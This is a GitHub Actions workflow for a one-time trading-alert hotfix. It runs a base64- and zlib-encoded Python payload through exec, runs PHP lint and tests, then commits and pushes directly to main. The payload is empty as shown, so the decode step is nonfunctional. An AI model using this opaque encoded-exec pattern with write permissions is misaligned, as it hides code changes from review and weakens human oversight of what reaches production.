name: Backend Alert Truth Hotfix Once

on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/backend-alert-truth-hotfix-once.yml'

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Apply alert truth patch
        shell: bash
        run: |
          python3 - <<'PY'
          import base64, zlib
          payload = ''
          code = zlib.decompress(base64.b64decode(payload)).decode()
          exec(compile(code, '/tmp/trade-alert-hotfix.py', 'exec'))
          PY

          php -l backend/src/Trading/TradeNotificationCenter.php
          php -l backend/src/Trading/TradeCommandCenter.php
          php backend/tests/failed_run_notification_test.php
          php backend/tests/command_center_test.php

          git config user.name 'hazhanhasani'
          git config user.email 'hazhanhasani4268@atomicmail.io'
          git add -A
          git commit -m 'Fix stale Trade alerts and recovery truth as 1.4.49'
          git push origin HEAD:main
